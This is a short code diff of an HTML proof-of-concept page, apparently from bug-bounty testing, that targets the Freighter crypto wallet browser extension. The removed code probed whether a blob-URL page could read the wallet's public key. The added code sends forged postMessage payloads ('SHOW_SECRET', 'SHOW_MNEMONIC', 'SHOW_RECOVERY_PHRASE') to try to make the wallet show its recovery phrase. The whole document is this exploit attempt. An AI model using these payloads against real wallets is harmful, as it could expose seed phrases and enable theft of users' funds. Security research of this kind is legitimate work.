@@ -1,14 +1,19 @@
-<button id="blobTest">CREATE BLOB URL & TEST FREIGHTER API</button>
+<button id="trigger">TRIGGER SHOW_SECRET</button>
 <script>
-document.getElementById('blobTest').onclick=()=>{
-  const html=`<html><body>
-  <script>
-  // blob origin = null, tapi Freighter inject provider = BUG
-  if(window.freighterApi){
-    freighterApi.getPublicKey().then(k=>alert('BUG: Got pubkey from blob: '+k))
-  }
-  <\/script></body></html>`;
-  const blob=new Blob([html],{type:'text/html'});
-  window.open(URL.createObjectURL(blob),'_blank');
+const payloads = [
+  {"type":"SHOW_SECRET","origin":"freighter"},
+  {"type":"SHOW_SECRET"},
+  {"request":{"type":"SHOW_MNEMONIC"}},
+  {"type":"SHOW_RECOVERY_PHRASE"}
+];
+
+document.getElementById('trigger').onclick = () => {
+  payloads.forEach((p,i)=>{
+    setTimeout(()=>{
+      window.postMessage(p, "*");
+    }, i*300);
+  });
 };
+// Kalau Freighter kebuka screen "Show Recovery Phrase" 
+// kayak screenshot 12.20 kamu = VULN Medium
 </script>
